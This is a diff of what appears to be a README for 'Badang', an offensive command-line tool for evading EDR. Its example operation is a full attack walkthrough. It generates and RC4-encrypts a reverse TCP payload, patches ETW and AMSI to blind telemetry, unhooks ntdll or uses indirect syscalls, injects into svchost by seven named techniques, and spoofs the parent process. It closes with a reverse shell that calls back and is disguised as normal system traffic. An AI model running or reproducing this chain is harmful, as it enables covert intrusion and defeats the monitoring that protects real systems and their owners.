@@ -4,46 +4,55 @@
 
 ```
 1. Initial Access         — phishing, exploit, creds (not Badang)
-2. Payload Generation     ← badang generate
-3. Recon Target Process   ← badang analyze
-4. EDR Bypass             ← badang unhook / syscall
-5. Injection              ← badang inject
-6. Post-Exploitation      — C2, lateral movement (not Badang)
+2. Payload Generation     ← badang generate + encrypt
+3. Telemetry Blinding     ← badang etw + amsi
+4. Recon Target Process   ← badang analyze + scan
+5. EDR Bypass             ← badang unhook / syscall --indirect
+6. Injection              ← badang inject (7 techniques) + ppid
+7. Runtime Evasion        ← badang sleep + spoof
+8. Post-Exploitation      — C2, lateral movement (not Badang)
 ```
 
-Badang covers stages 2–5: the hardest part where EDR evasion matters.
+Badang covers stages 2–7: the full evasion chain from payload to runtime.
 
 ## Example Operation
 
 ```bash
-# Step 1: Generate a reverse shell payload
+# Step 1: Generate and encrypt a reverse shell payload
 badang-cli generate --type reverse_tcp --lhost 192.168.1.10 --lport 4444 -o rev.bin
+badang-cli encrypt --payload rev.bin --method rc4 --key "s3cret" -o encrypted.bin
 
-# Step 2: Find a target process (svchost.exe, explorer.exe)
-# Note its PID from Task Manager
+# Step 2: Blind EDR telemetry
+badang-cli etw -x -c                     # patch EtwEventWrite
+badang-cli amsi -x -c                    # patch AmsiScanBuffer
 
-# Step 3: Scan for hooks
+# Step 3: Find a target process
+badang-cli scan --filter svchost
+
+# Step 4: Scan for hooks
 badang-cli analyze --pid 1234 -x -c
 # Result: NtCreateThreadEx HOOKED, NtWriteVirtualMemory HOOKED
 
-# Step 4: Bypass the EDR
+# Step 5: Bypass the EDR
 # Option A: Remove the hooks
 badang-cli unhook --unhook NtCreateThreadEx -x -c
-# Option B: Use direct syscall (skip ntdll)
-badang-cli syscall --func NtCreateThreadEx -x -c
+# Option B: Use indirect syscall (resolve SSN from ntdll, execute from ntdll gadget)
+badang-cli syscall --func NtCreateThreadEx --indirect -x -c
 
-# Step 5: Inject (pick a technique)
-badang-cli inject --pid 1234 --technique createremote --payload rev.bin -x -c
-# Or: APC injection (queues to alertable threads, no new thread)
-badang-cli inject --pid 1234 --technique apc --payload rev.bin -x -c
-# Or: Thread hijack (redirects existing thread, no new thread or APC)
-badang-cli inject --pid 1234 --technique hijack --payload rev.bin -x -c
-# Or: Early bird (spawns suspended process, APC runs before EDR hooks)
-badang-cli inject --technique earlybird --payload rev.bin -x -c
-# Or: Section mapping (no WriteProcessMemory — uses shared memory)
-badang-cli inject --pid 1234 --technique section --payload rev.bin -x -c
+# Step 6: Inject (pick a technique)
+badang-cli inject --pid 1234 --technique createremote --payload encrypted.bin -x -c
+badang-cli inject --pid 1234 --technique apc --payload encrypted.bin -x -c
+badang-cli inject --pid 1234 --technique hijack --payload encrypted.bin -x -c
+badang-cli inject --technique earlybird --payload encrypted.bin -x -c
+badang-cli inject --pid 1234 --technique section --payload encrypted.bin -x -c
+badang-cli inject --technique callback --payload encrypted.bin -x -c    # no thread creation
+badang-cli inject --technique stomp --payload encrypted.bin -x -c       # hides in signed DLL
 
-# Step 6: Reverse shell connects back from svchost.exe
+# Step 6b: Or spawn with spoofed parent + inject
+badang-cli ppid --parent explorer.exe --child notepad.exe --suspended -x -c
+# Then inject into the suspended child
+
+# Step 7: Reverse shell connects back from svchost.exe
 # Looks like normal system traffic to EDR and network monitors
 ```
 
